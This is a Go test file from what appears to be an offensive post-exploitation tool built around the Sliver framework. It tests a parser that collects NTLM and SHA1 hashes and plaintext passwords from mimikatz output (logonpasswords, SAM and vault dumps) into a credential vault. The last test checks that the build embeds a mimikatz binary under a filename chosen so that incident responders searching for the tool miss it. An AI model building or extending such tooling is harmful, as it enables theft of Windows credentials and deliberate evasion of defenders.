package sliver

import (
	"strings"
	"testing"

	"sliverreshine/internal/embed"
)

// sekurlsaOutput is trimmed from a real run against a domain-joined Windows 10
// host. It keeps the awkward parts: the machine account whose "password" is
// (null), the same plaintext repeated by three providers, and a field with no
// value at all.
const sekurlsaOutput = `
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:32:39
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY gentilkiwi
  '#####'

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : CORP$
Domain            : CORP
Logon Server      : DC01
SID               : S-1-5-18

	msv :
	 [00000003] Primary
	 * Username : CORP$
	 * Domain   : CORP
	 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
	 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709

	tspkg :
	 * Username : CORP$
	 * Domain   : CORP
	 * Password : (null)

Authentication Id : 0 ; 425310 (00000000:00067d5e)
Session           : Interactive from 1
User Name         : Administrator
Domain            : CORP
Logon Server      : DC01
SID               : S-1-5-21-111-222-333-500

	msv :
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : CORP
	 * NTLM     : 209c6174da490caeb422f3fa5a7ae634
	 * SHA1     : 8f4a2c1a9b3b0a1e5c6d7e8f9a0b1c2d3e4f5a6b

	wdigest :
	 * Username : Administrator
	 * Domain   : CORP
	 * Password : P@ssw0rd!

	kerberos :
	 * Username : Administrator
	 * Domain   : CORP
	 * Password : P@ssw0rd!
`

func TestParseMimikatzSekurlsa(t *testing.T) {
	got := ParseMimikatz(sekurlsaOutput, "sekurlsa::logonpasswords")

	// Two from the machine account (NTLM and SHA1; the (null) password must not
	// become a credential), two hashes for Administrator, and one plaintext
	// despite wdigest and kerberos both reporting it.
	if len(got) != 5 {
		t.Fatalf("expected 5 credentials, got %d: %+v", len(got), got)
	}

	want := []ParsedCredential{
		{Username: "CORP$", Domain: "CORP", Secret: "31d6cfe0d16ae931b73c59d7e0c089c0", Kind: "ntlm"},
		{Username: "CORP$", Domain: "CORP", Secret: "da39a3ee5e6b4b0d3255bfef95601890afd80709", Kind: "sha1"},
		{Username: "Administrator", Domain: "CORP", Secret: "209c6174da490caeb422f3fa5a7ae634", Kind: "ntlm"},
		{Username: "Administrator", Domain: "CORP", Secret: "8f4a2c1a9b3b0a1e5c6d7e8f9a0b1c2d3e4f5a6b", Kind: "sha1"},
		{Username: "Administrator", Domain: "CORP", Secret: "P@ssw0rd!", Kind: "plaintext"},
	}
	for i, w := range want {
		g := got[i]
		if g.Username != w.Username || g.Domain != w.Domain || g.Secret != w.Secret || g.Kind != w.Kind {
			t.Errorf("credential %d:\n got %+v\nwant %+v", i, g, w)
		}
		if g.Source != "sekurlsa::logonpasswords" {
			t.Errorf("credential %d: source = %q, want the command", i, g.Source)
		}
	}

	for _, c := range got {
		if c.Secret == "(null)" {
			t.Fatalf("the (null) placeholder leaked into the vault: %+v", c)
		}
	}
}

func TestParseMimikatzSAM(t *testing.T) {
	const out = `mimikatz(commandline) # lsadump::sam
Domain : DESKTOP-ABC
SysKey : 5d1c2b0a9f8e7d6c5b4a39281706f5e4
Local SID : S-1-5-21-999-888-777

SAMKey : 00112233445566778899aabbccddeeff

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000001f5 (501)
User : Guest
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000003e8 (1000)
User : alice
  Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c
`
	got := ParseMimikatz(out, "lsadump::sam")
	if len(got) != 3 {
		t.Fatalf("expected 3 local accounts, got %d: %+v", len(got), got)
	}
	// Administrator and Guest share the "no password" hash. They are different
	// accounts, so both must survive.
	if got[0].Username != "Administrator" || got[1].Username != "Guest" {
		t.Errorf("account order/names wrong: %+v", got)
	}
	if got[2].Username != "alice" || got[2].Secret != "8846f7eaee8fb117ad06bdd830b7586c" {
		t.Errorf("alice parsed wrong: %+v", got[2])
	}
	for _, c := range got {
		if c.Domain != "DESKTOP-ABC" {
			t.Errorf("%s: domain = %q, want the SAM header domain", c.Username, c.Domain)
		}
		if c.Kind != "ntlm" {
			t.Errorf("%s: kind = %q, want ntlm", c.Username, c.Kind)
		}
	}
}

func TestParseMimikatzVault(t *testing.T) {
	const out = `mimikatz(commandline) # vault::cred
Target Name : Domain:interactive=CORP\alice
Type        : Domain
  * Username : alice@corp.local
  * Password : Summer2026!

Target Name : LegacyGeneric:target=RDP/DC01
Type        : Generic
  * Username : corp\backup
  * Password : B4ckup#1
`
	got := ParseMimikatz(out, "vault::cred")
	if len(got) != 2 {
		t.Fatalf("expected 2 vault entries, got %d: %+v", len(got), got)
	}
	if got[0].Username != "alice@corp.local" || got[0].Secret != "Summer2026!" {
		t.Errorf("first vault entry wrong: %+v", got[0])
	}
	// The backslash already carries the domain, so it must not be doubled up.
	if got[1].Username != `corp\backup` {
		t.Errorf("username = %q, want corp\\backup", got[1].Username)
	}
	// The colon inside the target name must survive: only the first colon splits.
	if got[0].Domain != "" {
		t.Errorf("domain = %q, want empty", got[0].Domain)
	}
}

// A stale domain from the previous logon session must not be attached to the
// next one. Getting this wrong silently mislabels every credential after a
// session that had a bare "User Name".
func TestParseMimikatzResetsDomainPerBlock(t *testing.T) {
	const out = `User Name         : alice
Domain            : CORP

	msv :
	 * NTLM     : 11111111111111111111111111111111

Authentication Id : 0 ; 2 (00000000:00000002)
User Name         : bob

	msv :
	 * NTLM     : 22222222222222222222222222222222
`
	got := ParseMimikatz(out, "sekurlsa::logonpasswords")
	if len(got) != 2 {
		t.Fatalf("expected 2 credentials, got %d: %+v", len(got), got)
	}
	if got[0].Username != "alice" || got[0].Domain != "CORP" {
		t.Errorf("alice wrong: %+v", got[0])
	}
	if got[1].Username != "bob" {
		t.Errorf("bob wrong: %+v", got[1])
	}
	if got[1].Domain != "" {
		t.Errorf("bob inherited a stale domain %q", got[1].Domain)
	}
}

func TestParseMimikatzRejectsJunk(t *testing.T) {
	cases := []struct {
		name string
		in   string
	}{
		{"placeholder password", "\tmsv :\n\t * Username : alice\n\t * Password : (null)\n"},
		{"angle placeholder", "\tmsv :\n\t * Username : alice\n\t * NTLM     : <null>\n"},
		{"not applicable", "\tmsv :\n\t * Username : alice\n\t * NTLM     : n.a.\n"},
		{"short hash", "\tmsv :\n\t * Username : alice\n\t * NTLM     : deadbeef\n"},
		{"non hex hash", "\tmsv :\n\t * Username : alice\n\t * NTLM     : zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\n"},
		{"username only", "\tmsv :\n\t * Username : alice\n\t * Domain   : CORP\n"},
		{"prose", "ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)\n"},
		{"empty", ""},
	}
	for _, tc := range cases {
		if got := ParseMimikatz(tc.in, "test"); len(got) != 0 {
			t.Errorf("%s: expected nothing, got %+v", tc.name, got)
		}
	}
}

// Re-running a harvest is routine, so the same secret seen twice in one output
// must collapse. Different secrets for the same user must not.
func TestParseMimikatzDeduplicatesWithinOneRun(t *testing.T) {
	const out = `	msv :
	 * Username : alice
	 * Password : hunter2

	wdigest :
	 * Username : alice
	 * Password : hunter2

	kerberos :
	 * Username : alice
	 * Password : hunter2

	ssp :
	 * Username : alice
	 * Password : hunter3
`
	got := ParseMimikatz(out, "sekurlsa::logonpasswords")
	if len(got) != 2 {
		t.Fatalf("expected 2 distinct secrets, got %d: %+v", len(got), got)
	}
	if got[0].Secret != "hunter2" || got[1].Secret != "hunter3" {
		t.Errorf("wrong secrets kept: %+v", got)
	}
}

func TestStoreUsernameFoldsDomain(t *testing.T) {
	cases := []struct{ domain, user, want string }{
		{"CORP", "alice", `CORP\alice`},
		{"", "alice", "alice"},
		{"CORP", `CORP\alice`, `CORP\alice`}, // already qualified
		{"CORP", `OTHER\alice`, `OTHER\alice`},
		{"", "", ""},
	}
	for _, c := range cases {
		if got := storeUsername(c.domain, c.user); got != c.want {
			t.Errorf("storeUsername(%q, %q) = %q, want %q", c.domain, c.user, got, c.want)
		}
	}
}

func TestIsHex(t *testing.T) {
	if !isHex("31d6cfe0d16ae931b73c59d7e0c089c0", 32) {
		t.Error("a valid NTLM should pass")
	}
	if isHex("31d6cfe0d16ae931b73c59d7e0c089c", 32) {
		t.Error("31 characters should fail a 32-character check")
	}
	if isHex("31D6CFE0D16AE931B73C59D7E0C089C0", 32) != true {
		t.Error("uppercase hex should pass")
	}
	if !isHex("8f4a2c1a9b3b0a1e5c6d7e8f9a0b1c2d3e4f5a6b", 40) {
		t.Error("a valid SHA1 should pass")
	}
}

func TestSplitKVKeepsColonsInValue(t *testing.T) {
	k, v, ok := splitKV("Target Name : Domain:interactive=CORP\\alice")
	if !ok || k != "Target Name" || v != `Domain:interactive=CORP\alice` {
		t.Fatalf("got (%q, %q, %v)", k, v, ok)
	}
	if _, _, ok := splitKV("no colon here"); ok {
		t.Error("a line without a colon should not split")
	}
}

func TestDefaultsAreUsable(t *testing.T) {
	if DefaultMimikatzCommand == "" {
		t.Fatal("defaults must be populated")
	}
	// The binary is embedded rather than addressed by path, so what has to hold
	// is that this build carries one, that it is a real PE, and that the name it
	// is written under does not give the tool away -- a file called mimikatz.exe
	// in a temp directory is the first thing a responder greps for.
	if len(embed.Mimikatz) == 0 {
		t.Fatal("this build carries no mimikatz binary")
	}
	if embed.Mimikatz[0] != 'M' || embed.Mimikatz[1] != 'Z' {
		t.Error("the embedded payload is not a PE image")
	}
	if embed.MimikatzName == "" || strings.Contains(strings.ToLower(embed.MimikatzName), "mimikatz") {
		t.Errorf("the on-target filename gives the tool away: %q", embed.MimikatzName)
	}
	if mimikatzTimeout < 5*60*1000*1000*1000 {
		t.Errorf("a credential run needs a generous deadline, got %s", mimikatzTimeout)
	}
}
